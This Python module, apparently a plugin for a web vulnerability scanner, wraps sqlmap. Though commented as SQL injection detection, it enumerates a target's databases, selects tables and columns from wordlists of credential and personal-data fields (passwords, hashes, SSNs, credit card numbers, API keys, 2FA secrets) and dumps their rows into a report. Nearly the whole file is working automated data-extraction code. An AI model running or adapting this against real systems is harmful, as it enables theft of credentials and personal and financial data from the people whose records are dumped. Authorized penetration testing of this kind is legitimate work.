from .abstract_scanner_module import AbstractScannerModule

import re
import subprocess    
import os
import csv
import glob

SYSTEM_DBS = ['information_schema', 'mysql', 'performance_schema', 'sys']
TABLES_WORDLIST = [
    'users', 'user', 'tbl_users', 'sys_users', 'account', 'accounts', 
    'auth_user', 'login', 'credentials', 'creds', 'members', 'web_users', 
    'profiles', 'user_profile', 'user_info', 'user_details', 'customers', 
    'admins', 'staff', 'employees', 'operators', 'superusers', 
    'wp_users', 'joomla_users', 'drupal_users', 'aspnet_Users'
]

COLUMNS_WORDLIST = [
    'username', 'uname', 'login', 'login_id', 'alias', 'handle', 'nickname',
    'password', 'pass', 'passwd', 'pwd', 'hash', 'secret', 'password_hash',
    'email', 'e-mail', 'mail', 'email_address', 'contact_email',
    'first_name', 'fname', 'last_name', 'lname', 'surname', 'fullname', 'display_name',
    'ssn', 'dob', 'birthdate', 'gender', 'phone', 'mobile', 'address',
    'cc_number', 'credit_card', 'card_num', 'billing_address', 'tax_id',
    'user_id', 'uid', 'id', 'uuid', 'guid', 'role', 'privilege', 'access_level',
    'is_admin', 'is_staff', 'permission_bits', 'is_active', 'status',
    'last_login', 'created_at', 'updated_at', 'deleted_at',
    'remember_token', 'reset_token', 'api_key', 'session_id', 'two_factor_secret'
]

class SqlmapScannerModule(AbstractScannerModule): #detect SQLi
    
    def scan(self, target_url):
        target_host = target_url.split("//")[-1].split("/")[0]
        base_dump_dir = f'/home/kali/.local/share/sqlmap/output/{target_host}/dump/'

        command = ['sqlmap','-u', target_url,'-dbs', "--batch"]
        
        common_error_message = "Error! SQLmap encountered an error, make sure the URL is parameterized."

        result = self.execute_subprocess_command(command)
        if not result or "[CRITICAL]" in result.stdout:
            print(f"[-] Sqlmap reported a failure for {target_url}")
            return self.return_error_output(target_url, common_error_message)
            
        dbs_found = self.extract_databases(result.stdout)
        to_search_dbs = [db for db in dbs_found if db not in SYSTEM_DBS]
        
        all_scan_results = []

        for searchable_db in to_search_dbs:
            command = ['sqlmap','-u', target_url,'-D',searchable_db,'--tables', "--batch"]
            result = self.execute_subprocess_command(command)
            if not result or "[CRITICAL]" in result.stdout:
                print(f"[-] Sqlmap reported a failure for {target_url}")
                return self.return_error_output(target_url, common_error_message)
            
            tables = self.filter_tables(result.stdout)
            db_results = {'database': searchable_db, 'tables': []}

            for table in tables:
                command = ['sqlmap','-u', target_url,'-D',searchable_db,'-T',table,"--columns", "--batch"]
                result = self.execute_subprocess_command(command)
                if not result or "[CRITICAL]" in result.stdout:
                    print(f"[-] Sqlmap reported a failure for {target_url}")
                    return self.return_error_output(target_url, common_error_message)
                        
                columns = self.filter_columns(result.stdout)
                delimiter = ","
                columns_joined_string = delimiter.join(columns)

                command = ['sqlmap','-u', target_url, '-D',searchable_db,'-T',table,"-C",columns_joined_string,"--dump", "--batch"]
                result = self.execute_subprocess_command(command)
                if not result or "[CRITICAL]" in result.stdout:
                    print(f"[-] Sqlmap reported a failure for {target_url}")
                    return self.return_error_output(target_url, common_error_message)
            
                db_specific_dump_dir = os.path.join(base_dump_dir, searchable_db)
                latest_csv = self.get_latest_sqlmap_csv(db_specific_dump_dir,table)

                dumped_data = []
                if latest_csv:
                    dumped_data = self.parse_sqlmap_csv(latest_csv)
                
                db_results['tables'].append({
                    'table_name': table,
                    'columns': columns,
                    'data': dumped_data
                })

            all_scan_results.append(db_results)

        return self.save_to_vulnerability_model(all_scan_results, target_url)
    
    def extract_databases(self, output):
        section_match = re.search(r"available databases \[\d+\]:(.*?)(?:\n\n|\[\d{2}:\d{2}:\d{2}\])", output, re.DOTALL)
        if section_match:
            db_section = section_match.group(1)
            return re.findall(r"\[\*\]\s+(.*)", db_section)
        
        return []

    def filter_tables(self, database_output):
        pattern = r"^\s*\|\s*([^|]+?)\s*\|\s*$"
        table_names = [name.strip() for name in re.findall(pattern, database_output, re.MULTILINE)]

        filtered_tables = [table for table in table_names if table in TABLES_WORDLIST]

        return filtered_tables

    def filter_columns(self, table_output):
        pattern = r"^\s*\|\s*([^|]+?)\s*\|\s*([^|]+?)\s*\|\s*$"
        all_rows = re.findall(pattern, table_output, re.MULTILINE)

        columns = [
            {'name': col.strip(), 'type': typ.strip()} 
            for col, typ in all_rows 
            if col.strip().lower() != 'column'
        ]

        filtered_columns = [column['name'] for column in columns if column['name'] in COLUMNS_WORDLIST]
        return filtered_columns

    def parse_sqlmap_csv(self, file_path):
        findings = []
        if os.path.exists(file_path):
            with open(file_path, mode='r', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    findings.append(row)
        return findings

    def get_latest_sqlmap_csv(self, directory_path, table_name):
        search_pattern = os.path.join(directory_path, f"{table_name}.csv*")
        files = glob.glob(search_pattern)
        if not files:
            return None
        
        latest_file = max(files, key=os.path.getmtime)
        return latest_file

    def save_to_vulnerability_model(self, results, target_url):

        structured_findings = []
        
        for db_finding in results:
            for table_finding in db_finding['tables']:
                entry = {
                    "database": db_finding['database'],
                    "table": table_finding['table_name'],
                    "columns": table_finding['columns'],
                    "rows": table_finding['data']
                }
                structured_findings.append(entry)

        vulnerability = {
            "type": "SQL Injection (SQLi)",
            "details": {"findings": structured_findings},
            "url_found": target_url,
            "severity": "CRITICAL"
        }
    
        return [vulnerability]

    def return_error_output(self, target_url, message):
        error_found = {
                        "type": "SQL Injection (SQLi)",
                        "url_found": target_url,
                        "severity": "ERROR",
                        "details": {
                            "message": [
                                message
                            ]
                        }
                }
                    
        return error_found

    def execute_subprocess_command(self, command):
        home_dir = '/home/kali/'

        try:
            result = subprocess.run(
                                    command,
                                    capture_output=True, 
                                    text=True, 
                                    timeout=300,
                                    check=True,
                                    cwd=home_dir
            )  
            return result
        
        except subprocess.CalledProcessError:
            print("sqlmap failed")

        return None

